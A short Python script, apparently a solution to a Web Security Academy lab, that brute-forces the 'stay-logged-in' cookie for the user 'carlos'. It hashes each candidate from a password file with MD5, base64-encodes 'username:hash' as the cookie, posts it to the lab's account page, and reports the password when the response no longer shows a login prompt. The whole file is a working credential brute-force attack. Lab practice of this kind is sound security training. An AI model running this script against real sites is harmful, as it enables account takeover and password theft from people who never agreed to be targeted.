import requests
import hashlib
import base64

lab_url = 'https://0a8100d904ff17eb8008673e00d8002d.web-security-academy.net/my-account'

cookies = {'stay-logged-in': '12331'}

"""
Same as stay-login-cookie-1
First use md5 to encrypt the password
then set the cookie to base64(username:md5(password))
But no password list this time
"""

def readFile(fileName):
    with open(fileName, "r", encoding="utf-8") as file:
        return file.read().splitlines()

victim_username = 'carlos' 
passwords = readFile("passwords.txt")

def createMD5Hash(password):
    return hashlib.md5(password.encode("utf-8")).hexdigest()

def base64Encoding(username, password):
    payload = f"{username}:{password}"
    text_bytes = payload.encode("utf-8")
    encoded_bytes = base64.b64encode(text_bytes)
    return encoded_bytes.decode("utf-8")


for password in passwords:
    cookies = {'stay-logged-in': base64Encoding(victim_username, createMD5Hash(password))}
    response = requests.post(url=lab_url, cookies=cookies)
    if "Login" not in response.text:
        print(f"Password for {victim_username} is {password}")
        break